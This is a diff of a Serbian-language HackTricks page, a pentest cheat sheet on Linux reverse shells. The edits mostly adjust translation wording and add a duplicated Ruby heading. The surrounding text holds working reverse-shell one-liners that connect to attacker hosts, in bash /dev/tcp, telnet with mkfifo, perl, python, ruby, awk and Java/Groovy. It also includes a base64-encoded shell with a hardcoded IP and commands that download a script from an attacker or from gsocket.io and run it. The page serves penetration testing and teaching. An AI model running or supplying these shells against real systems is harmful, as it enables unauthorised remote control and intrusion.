@@ -16,7 +16,7 @@ Drugi načini podrške HackTricks-u:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -41,9 +41,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Bezbedan simbolni shell
+### Simbol bezbedna ljuska
 
-Ne zaboravite da proverite i druge shelove: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
+Ne zaboravite da proverite i sa drugim ljuskama: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -54,20 +54,20 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Objasnjenje Shell-a
 
-1. **`bash -i`**: Ovaj deo komande pokrece interaktivnu (`-i`) Bash ljusku.
-2. **`>&`**: Ovaj deo komande je skracena oznaka za **preusmeravanje i standardnog izlaza** (`stdout`) i **standardne greske** (`stderr`) na **isti odrediste**.
-3. **`/dev/tcp/<NAPADAC-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP vezu sa navedenom IP adresom i portom**.
-* **Preusmeravanjem izlaznih i gresnih tokova u ovaj fajl**, komanda efikasno salje izlaz interaktivne ljuske sesije na masinu napadaca.
-4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na isto odrediste kao i standardni izlaz (`stdout`)**.
+1. **`bash -i`**: Ovaj deo komande pokreće interaktivnu (`-i`) Bash ljusku.
+2. **`>&`**: Ovaj deo komande je skraćena oznaka za **preusmeravanje kako standardnog izlaza** (`stdout`) tako i **standardne greške** (`stderr`) na **isti odredište**.
+3. **`/dev/tcp/<IP-NAPADACA>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP konekciju ka navedenoj IP adresi i portu**.
+* **Preusmeravanjem izlaznih i grešnih tokova u ovaj fajl**, komanda efikasno šalje izlaz interaktivne ljuske sesije ka računaru napadača.
+4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na isto odredište kao standardni izlaz (`stdout`)**.
 
-### Kreiraj u fajlu i izvrsi
+### Kreiraj u fajlu i izvrši
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
 ## Napredna ljuska
 
-Kada se suočite sa ranjivošću **Remote Code Execution (RCE)** unutar veb aplikacije zasnovane na Linuxu, postizanje reverzne ljuske može biti otežano zbog mrežnih odbrana poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) ljuske kako biste efikasnije interagirali sa kompromitovanim sistemom.
+Kada se suočite sa ranjivošću **Udaljenog izvršenja koda (RCE)** unutar veb aplikacije zasnovane na Linuxu, postizanje reverzne ljuske može biti otežano zbog mrežnih odbrana poput iptables pravila ili složenih mehanizama filtriranja paketa. U takvim ograničenim okruženjima, alternativni pristup uključuje uspostavljanje PTY (Pseudo Terminal) ljuske kako biste efikasnije interagirali sa kompromitovanim sistemom.
 
 Preporučeni alat za tu svrhu je [toboggan](https://github.com/n3rada/toboggan.git), koji pojednostavljuje interakciju sa ciljnim okruženjem.
 
@@ -105,11 +105,11 @@ Druga mogućnost je korišćenje implementacije `IppSec` forward ljuske [**https
 
 Samo trebate izmeniti:
 
-- URL ranjivog hosta
-- Prefiks i sufiks vašeg payload-a (ako postoji)
-- Način slanja payload-a (zaglavlja? podaci? dodatne informacije?)
+* URL ranjivog hosta
+* Prefiks i sufiks vašeg payload-a (ako postoji)
+* Način slanja payload-a (zaglavlja? podaci? dodatne informacije?)
 
-Zatim možete jednostavno **slati komande** ili čak **koristiti komandu `upgrade`** da biste dobili potpunu PTY (imajte na umu da se cjevovodi čitaju i pišu sa oko 1.3s kašnjenja).
+Zatim možete jednostavno **slati komande** ili čak **koristiti komandu `upgrade`** da biste dobili potpunu PTY (imajte na umu da se cevi čitaju i pišu sa oko 1.3s kašnjenja).
 
 ## Netcat
 ```bash
@@ -127,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet je jednostavan protokol za pristup udaljenom računaru preko mreže. On omogućava korisniku da se prijavi na udaljeni sistem i izvršava komande kao da je direktno povezan sa njim.
+Telnet je popularan protokol za udaljenu komunikaciju koji omogućava korisnicima da se povežu i komuniciraju sa udaljenim računarima putem mreže.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -159,6 +159,8 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
+## Ruby
+
 ## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -281,7 +283,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Da biste poslali komandu, napišite je, pritisnite Enter, a zatim pritisnite CTRL+D (da zaustavite STDIN)
+Da biste poslali komandu, napišite je, pritisnite Enter i pritisnite CTRL+D (da zaustavite STDIN)
 
 **Žrtva**
 ```bash
@@ -327,7 +329,7 @@ Xnest :1
 ```
 ## Groovy
 
-od [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NAPOMENA: Java reverzna ljuska takođe radi za Groovy
+od [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NAPOMENA: Java reverse shell takođe radi za Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -343,7 +345,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -353,7 +355,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
